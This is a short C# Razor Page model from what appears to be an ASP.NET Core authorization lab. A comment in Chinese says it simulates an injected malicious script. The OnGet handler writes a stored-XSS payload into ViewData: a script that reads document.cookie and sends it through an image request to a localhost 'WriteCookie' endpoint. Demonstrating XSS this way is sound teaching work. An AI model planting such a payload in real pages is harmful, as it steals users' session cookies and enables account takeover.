using Microsoft.AspNetCore.Mvc.RazorPages;

namespace AuthorizationBaseLab.Pages
{
    public class XssModel : PageModel
    {
        public void OnGet()
        {
            // 模拟被攻击注入恶意脚本并返回给前端页面
            ViewData["xss"] = "<p><script>let img = document.createElement('img');img.src = 'https://localhost:7272/Xss/WriteCookie?cookie=' + encodeURIComponent(document.cookie);document.body.appendChild(img);</script></p>";
        }
    }
}
